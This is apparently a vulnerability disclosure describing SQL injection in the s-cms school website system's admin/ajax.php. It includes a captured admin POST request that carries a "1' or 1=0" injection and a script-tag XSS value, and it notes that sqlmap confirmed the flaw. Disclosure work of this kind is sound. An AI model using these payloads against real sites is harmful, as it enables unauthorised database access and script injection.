##  Analysis of SQL injection vulnerabilities in s-cms school website building system (including applets)
### Vulnerability Analysis
In the file \qpqywz-v5.0.0325\4.edu.scms5\admin\ajax.php, the parameter $sql is not strictly filtered.
<img width="418" alt="图片" src="https://user-images.githubusercontent.com/128341787/226555568-f9c8620f-7a87-4757-ae74-8262407eae96.png">
### Vulnerability verification

Log in to the background, and at the menu management module - New menu, add a menu to grab data packets and test the data packets.
<img width="413" alt="图片" src="https://user-images.githubusercontent.com/128341787/226555859-4f0bffe4-5269-411b-a299-658a8925d64b.png">

<img width="413" alt="图片" src="https://user-images.githubusercontent.com/128341787/226555906-e11210b9-f444-4b69-9f37-ab173142b8df.png">



Obtain the request package and response package as follows

```
POST /admin/ajax.php?action=save&type=menu&lang=0 HTTP/1.1
Host: s-cms
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 5035
Origin: http://s-cms
Connection: close
Referer: http://s-cms/admin/
Cookie: count_all=0; authx=; userx=; passx=; user=admin; pass=e317896f881c24dd527ea70a654d0a00; A_type=1; auth=1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1%7C1; newsauth=all; productauth=all; textauth=all; formauth=all; bbsauth=all; add=%E6%9C%AC%E5%9C%B0%E6%9C%AC%E5%9C%B0%E6%9C%AC%E5%9C%B0; PHPSESSID=d137s9gahccif2r0eif5pt918e
order_1=1' or 1=0 &title_1=%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5&entitle_1=index&url_1=&hide_1%5B%5D=0&sub_1=0&order_67=1&title_67=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E&entitle_67=%3Cbr+%2F%3E%3Cb%3EDeprecated%3C%2Fb%3E%3A+Automatically+populating+%24HTTP_RAW_POST_DATA+is+deprecated+and+will+be+removed+in+a+future+version.+To+avoid+this+warning+set+'always_populate_raw_post_data'+to+'-1'+in+php.ini+and+use+the+php%3A%2F%2Finput+stream+instead.+in+%3Cb%3EUnknown%3C%2Fb%3E+on+line+%3Cb%3E0%3C%2Fb%3E%3Cbr+%2F%3E%3Cbr+%2F%3E%3Cb%3EWarning%3C%2Fb%3E%3A+Cannot+modify+header+information+-+headers+already+sent+in+%3Cb%3EUnknown%3C%2Fb%3E+on+line+%3Cb%3E0%3C%2Fb%3E%3Cbr+%2F%3E%3Cbr+%2F%3E%3Cb%3EWarning%3C%2Fb%3E%3A+Cannot+modify+header+information+-+headers+already+sent+in+%3Cb%3EC%3Aphpstudy_proWWWS-CMSfunctionconn.php%3C%2Fb%3E+on+line+%3Cb%3E3%3C%2Fb%3E%3Cbr+%2F%3E%3Cbr+%2F%3E%3Cb%3EWarning%3C%2Fb%3E%3A+session_start()%3A+Cannot+send+session+cache+limiter+-+headers+already+sent+in+%3Cb%3EC%3Aphpstudy_proWWWS-CMSfunctionconn.php%3C%2Fb%3E+on+line+%3Cb%3E4%3C%2Fb%3E%3Cbr+%2F%3E11&url_67=&hide_67%5B%5D=0&sub_67=0&order_41=2&title_41=%E5%AD%A6%E6%A0%A1%E6%A6%82%E5%86%B5&entitle_41=General+situation+of+school&url_41=&hide_41%5B%5D=0&sub_41=0&order_42=1&title_42=%E5%AD%A6%E6%A0%A1%E7%AE%80%E4%BB%8B&entitle_42=School+profiles&url_42=&hide_42%5B%5D=0&sub_42=41&order_43=2&title_43=%E5%8A%9E%E5%AD%A6%E7%90%86%E5%BF%B5&entitle_43=School+running+idea&url_43=&hide_43%5B%5D=0&sub_43=41&order_44=3&title_44=%E7%BB%84%E7%BB%87%E6%9C%BA%E6%9E%84&entitle_44=Organization&url_44=&hide_44%5B%5D=0&sub_44=41&order_45=4&title_45=%
```


Use the tool sqlmap to verify that SQL injection exists

<img width="402" alt="图片" src="https://user-images.githubusercontent.com/128341787/226559684-a9c7ea43-4b33-49ff-87d7-7840e01e79ab.png">

<img width="402" alt="图片" src="https://user-images.githubusercontent.com/128341787/226559705-173a7047-8311-41be-bc53-7c563e22a6c5.png">


